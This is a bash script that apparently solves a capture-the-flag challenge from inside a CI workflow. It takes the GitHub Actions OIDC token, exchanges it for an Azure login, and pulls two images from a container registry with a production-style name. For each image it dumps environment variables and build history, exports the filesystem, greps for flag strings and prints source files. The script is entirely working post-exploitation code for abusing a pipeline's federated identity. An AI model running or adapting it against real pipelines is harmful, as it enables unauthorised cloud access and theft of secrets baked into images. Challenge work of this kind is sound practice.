#!/usr/bin/env bash
set -uo pipefail
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$IDT" -o none 2>&1 | head -3
az acr login -n crtblplatprodx3euoz 2>&1 | head -3

for R in tebamoto-reporting-api catalog-api; do
  IMG="crtblplatprodx3euoz.azurecr.io/$R:latest"
  echo "######## $R"
  docker pull -q "$IMG" 2>&1 | head -3
  echo "--- config"
  docker image inspect "$IMG" --format '{{json .Config.Env}} {{json .Config.Cmd}} {{json .Config.Entrypoint}} {{json .Config.Labels}}' 2>&1 | head -5
  echo "--- history"
  docker history --no-trunc --format '{{.CreatedBy}}' "$IMG" 2>/dev/null | head -20 | cut -c1-240
  CT=$(docker create "$IMG" 2>/dev/null)
  rm -rf /tmp/x; mkdir -p /tmp/x
  docker export "$CT" 2>/dev/null | tar -xf - -C /tmp/x 2>/dev/null
  docker rm "$CT" >/dev/null 2>&1
  echo "--- app files"
  find /tmp/x -maxdepth 3 \( -name '*.py' -o -name '*.json' -o -name '*.env' -o -name '*.txt' \) \
       -not -path '*/site-packages/*' -not -path '*/usr/lib/*' 2>/dev/null | head -25
  echo "--- flag grep (whole fs)"
  grep -raoiE '(DF26|flag|CTF)\{[^}]{0,250}\}' /tmp/x 2>/dev/null | sort -u | head -10
  echo "--- main source"
  for F in $(find /tmp/x -maxdepth 3 -name '*.py' -not -path '*/site-packages/*' 2>/dev/null | head -4); do
    echo "===== $F"; head -c 5000 "$F"; echo
  done
done
echo "=== done ==="